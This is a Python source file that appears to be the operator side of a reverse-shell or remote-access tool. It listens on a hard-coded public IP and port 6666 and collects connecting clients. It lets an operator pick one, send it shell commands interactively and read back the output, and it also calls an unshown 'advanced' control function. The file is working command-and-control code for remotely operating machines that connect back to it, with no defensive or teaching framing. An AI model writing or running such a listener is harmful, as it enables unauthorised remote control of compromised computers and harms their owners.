import socket
import threading
import time
from server_functions import advanced

ip = "3.1.5.107" # either ip or hostname
port = 6666
sock = None
clients = []

def create_socket():
    global sock
    sock = socket.socket()

  

def bind_socket():
    sock.bind((ip,port))
    sock.listen(5)
    
def wait_to_connect():
    global clients
    while True:
        s, address = sock.accept()
        print(s.getpeername()[0] + " has connected!")
        clients.append(s)
        time.sleep(1)

def send(client,text):
    client.send(bytes(text, "utf-8"))

def recv(client, chuncks):
    return client.recv(chuncks).decode("utf-8")

def background_stage():
    while True:
        cmd = input("Background: ")
        if cmd == "list":
            a = 0
            while a < len(clients):
                print(" ----- " + str(a + 1) +") " + clients[a].getpeername()[0] + " ----- ")
                a += 1
        elif cmd.startswith("control"):
            client_num = int(cmd.replace("control ", "")) - 1
            # control(clients[client_num])
            try:
                advanced(clients[client_num], ip)
            except:
                pass
        

def send_shell():
    cmd = input()
    return cmd

def exit(client):
    client.close()
    sock.close()

def control(client):
    print(recv(client,1024), end='')
    while True:
        cmd = send_shell()
        if cmd == "background":
            send(client,cmd)
            break
        send(client,cmd)
        print(recv(client,1024), end='')
        

create_socket()
bind_socket()
threading.Thread(target=wait_to_connect).start()
background_stage()